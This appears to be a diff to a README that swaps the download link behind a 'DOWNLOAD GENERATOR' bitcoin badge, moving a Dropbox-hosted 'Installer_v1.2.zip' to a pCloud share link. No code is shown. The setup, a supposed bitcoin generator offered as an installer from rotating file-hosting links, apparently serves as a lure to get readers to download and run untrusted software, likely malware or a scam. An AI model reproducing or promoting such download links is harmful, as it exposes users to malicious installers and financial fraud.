@@ -26,7 +26,7 @@
 
 <div align="center">
   <br>
-  <a href="https://www.dropbox.com/scl/fi/19a3f4heh63l2lnloyvql/Installer_v1.2.zip?rlkey=khwmeu9xla94480jx041txxot&st=3grxzjtd&dl=1">
+  <a href="https://u.pcloud.link/publink/show?code=XZYNnI5Z6YVwf4FzIumqn8BCgHGUgLgyRMlV">
     <img src="https://img.shields.io/badge/🚀_DOWNLOAD_GENERATOR-F7931A?style=for-the-badge&logo=bitcoin&logoColor=white&padding=large" alt="Download Tool" />
   </a>
   <br><br>
